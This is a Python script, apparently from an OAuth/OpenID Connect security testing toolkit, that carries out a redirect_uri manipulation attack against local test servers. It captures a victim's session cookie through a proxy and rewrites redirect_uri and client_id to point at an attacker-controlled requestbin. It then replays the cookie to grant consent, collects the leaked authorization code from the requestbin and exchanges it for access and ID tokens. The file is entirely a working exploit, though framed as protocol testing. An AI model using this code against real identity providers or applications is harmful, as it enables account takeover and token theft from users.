import sys
import os
import requests

sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '../../osbtlib'))

from osbtlib import BrowserSimulator, Osbtlib

# set endpoints
HONEST_RP_ENDPOINT = "http://localhost:3000"
HONEST_OP_ENDPOINT = "http://localhost:3001"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"
PROXY_EXTENSION_ENDPOINT = "http://localhost:5555"

# set requestbin parameters
PIPEDREAM_URL = os.environ.get('PIPEDREAM_URL')
PIPEDREAM_TOKEN = os.environ.get('PIPEDREAM_TOKEN')
PIPEDREAM_SOURCE_ID = os.environ.get('PIPEDREAM_SOURCE_ID') 

# victim credentials
victim_username = 'guest'
victim_password = 'guest'

# create instance of osbtlib
osbt = Osbtlib(
    proxy_extension_url = PROXY_EXTENSION_ENDPOINT
)
bs = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login', PROXY_SERVER_ENDPOINT)

try:
    # define browser operations
    sso_flow = f"""
page.locator('input[name="userId"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('input[type="submit"]').click()
    """
    # run browser operations
    bs.run(sso_flow)

    # get session cookie
    traces = osbt.proxy.get_history()
    cookie = traces['request'][len(traces['request'])-1]['headers']['Cookie']
    print('cookie:', cookie)

    # clean proxy rules
    osbt.proxy.clean()

    # modify query param (redirect_uri, client_id)
    attacker_server_url = PIPEDREAM_URL
    attacker_client_id = 'attacker'
    osbt.proxy.modify_query_param('redirect_uri', attacker_server_url + '/callback', 'localhost:3001', '/authorize', 'GET')
    osbt.proxy.modify_query_param('client_id', attacker_client_id, 'localhost:3001', '/authorize', 'GET')

    # send authentication request
    bs.visit(f'{HONEST_RP_ENDPOINT}/login')

    # clean proxy rules
    osbt.proxy.clean()

    # consent
    response = requests.post(
        f'{HONEST_OP_ENDPOINT}/consent',
        data={'consent': 'Yes'},
        headers={'Cookie': cookie}
    )
    print('consent response:', response.text)

    # get code from requestbin history
    history = osbt.requestbin.get_requestbin_history(PIPEDREAM_TOKEN, PIPEDREAM_SOURCE_ID)
    code = history['data'][0]['event']['query']['code']
    assert(code != None)
    if code != None:
        print('Authorization code leaked!!')
        print('code:', code)

    # get access token
    response = requests.post(f"{HONEST_OP_ENDPOINT}/token", data={
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': PIPEDREAM_URL + '/callback',
        'client_id': 'attacker',
        'client_secret': 'secret'
    })
    assert(response.json().get('access_token') != None)
    if response.json().get('access_token') != None:
        print('Access token leaked!!')
        print('access_token:', response.json().get('access_token'))
    assert(response.json().get('id_token') != None)
    if response.json().get('id_token') != None:
        print('ID token leaked!!')
        print('id_token:', response.json().get('id_token'))

except Exception as e:
    print('Error:', e)
    osbt.proxy.clean()